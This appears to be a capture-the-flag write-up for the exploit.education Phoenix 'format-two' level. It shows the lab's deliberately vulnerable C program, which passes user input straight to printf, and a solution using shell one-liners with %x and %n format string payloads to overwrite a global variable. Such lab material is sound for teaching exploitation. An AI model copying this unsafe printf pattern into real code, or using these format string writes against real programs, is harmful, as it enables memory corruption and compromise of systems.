# Format Two

## Code

```
/*
 * phoenix/format-two, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * What kind of flower should never be put in a vase?
 * A cauliflower.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[256];

  printf("%s\n", BANNER);

  if (argc > 1) {
    memset(buf, 0, sizeof(buf));
    strncpy(buf, argv[1], sizeof(buf));
    bounce(buf);
  }

  if (changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    puts("Better luck next time!\n");
  }

  exit(0);
}
```

## Solution
In this case we need to use the format string vulnerability to modify the changeme variable. first we need to locate the address of changeme, using objdump and searching for the compare.

then we need to find the exact number that retrive our value we give as first input:

```
./format-two $(python -c 'import struct; print("AAAA" + "%x"*12)')
```

You will see that the 12th parameter is "41414141", our string in hex.

Then we will use the %n to write the length of the string in change me, with this:

```
./format-two $(python -c 'import struct; print(struct.pack("<I", 0x8049868) + "%x"*11 + "%n")')
```
